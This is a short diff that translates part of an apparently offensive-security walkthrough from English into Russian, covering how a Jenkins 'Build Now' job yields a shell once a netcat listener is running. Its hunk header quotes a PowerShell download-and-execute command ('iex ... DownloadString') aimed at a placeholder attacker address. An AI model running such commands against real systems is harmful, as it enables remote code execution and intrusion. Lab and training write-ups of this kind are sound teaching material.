@@ -76,13 +76,13 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://imgur.com/Ffh7FPk.png"/>
 
-And our command will look like this , start a netcat listener
+И наша команда будет выглядеть так: запустите прослушиватель netcat:
 
 <img src="https://imgur.com/L7kRLea.png"/>
 
 <img src="https://imgur.com/GGcjVVU.png"/>
 
-Now click on `Build Now` and that job will run and you'll get a shell
+Теперь нажмите `Build Now`, и это задание будет запущено, и Вы получите оболочку:
 
 <img src="https://imgur.com/2LThZZr.png"/>
 
